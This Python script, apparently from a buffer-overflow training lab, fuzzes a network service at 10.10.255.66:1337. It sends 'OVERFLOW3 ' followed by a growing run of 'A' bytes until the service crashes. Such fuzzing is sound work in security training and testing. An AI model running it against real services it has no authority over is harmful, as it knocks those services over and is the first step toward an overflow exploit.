#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.255.66"

port = 1337
timeout = 5
prefix = b"OVERFLOW3 "

string = prefix + b"A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(string)
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * b"A"
  time.sleep(1)